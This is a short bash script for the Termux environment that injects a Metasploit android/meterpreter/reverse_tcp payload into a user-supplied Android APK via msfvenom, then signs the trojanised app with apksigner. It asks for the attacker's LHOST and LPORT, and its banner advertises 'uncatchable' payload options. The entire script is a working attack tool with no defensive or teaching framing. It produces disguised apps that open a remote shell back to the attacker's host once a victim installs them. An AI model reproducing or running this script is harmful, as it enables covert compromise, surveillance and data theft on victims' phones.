#!/bin/bash
# Inject Payload in Android APK for Termux
# Modified Version for Termux Environment with Uncatchable Payload Options
clear
 cat << EOF

  _____       _           _              _____  _  __
 |_   _|     (_)         | |       /\   |  __ \| |/ /
   | |  _ __  _  ___  ___| |_     /  \  | |__) | ' / 
   | | | '_ \| |/ _ \/ __| __|   / /\ \ |  ___/|  <  
  _| |_| | | | |  __/ (__| |_   / ____ \| |    | . \ 
 |_____|_| |_| |\___|\___|\__| /_/    \_\_|    |_|\_\ 
            _/ |                                     
           |__/                 Version : 2.0.1
                             Modified for Termux 

EOF
echo -n "Loading"
for i in {1..3}; do
    echo -n "."
    sleep 0.5
done
sleep 1
echo
echo
# Ask for inputs
read -p "Enter the path to the original APK (e.g., /storage/emulated/0/Download/original.apk): " original_apk
read -p "Enter your IP address (LHOST): " lhost
read -p "Enter the port number (LPORT): " lport
read -p "Enter the name for the output APK (e.g., Inject_apk.apk): " output_apk

# Check if the original APK exists
if [ ! -f "$original_apk" ]; then
    echo "Error: Original APK not found at $original_apk"
    exit 1
fi

# Generate the payload APK
echo "[*] Injecting payload to APK..."
msfvenom -x "$original_apk" -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$output_apk"

# Check if the payload APK was created successfully
if [ $? -eq 0 ]; then
    echo " [+] Payload successfully bound to APK: $output_apk"
else
    echo "[-] Failed to inject payload to APK."
    exit 1
fi

# Sign the APK (ensure you have a valid keystore in the same directory or provide the correct path)
echo "[*] Signing the APK..."
apksigner sign --ks my-release-key.keystore "$output_apk"

if [ $? -eq 0 ]; then
    echo "[+] APK successfully signed: $output_apk"
else
    echo "[-] Failed to sign the APK. Please check your keystore."
    exit 1
fi

echo  "[*] Process complete!"
